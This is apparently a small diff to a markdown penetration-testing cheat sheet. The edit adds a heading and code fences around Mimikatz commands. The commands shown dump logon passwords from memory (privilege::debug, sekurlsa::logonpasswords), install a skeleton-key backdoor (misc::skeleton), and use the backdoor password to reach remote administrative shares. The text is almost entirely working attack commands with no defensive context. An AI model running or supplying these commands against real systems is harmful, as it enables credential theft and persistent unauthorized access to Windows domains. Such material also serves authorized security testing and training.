@@ -1,4 +1,5 @@
-Mimikatz
+## Mimikatz
+```
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords    
 
@@ -152,3 +153,4 @@ mimikatz # privilege::debug
 mimikatz # misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
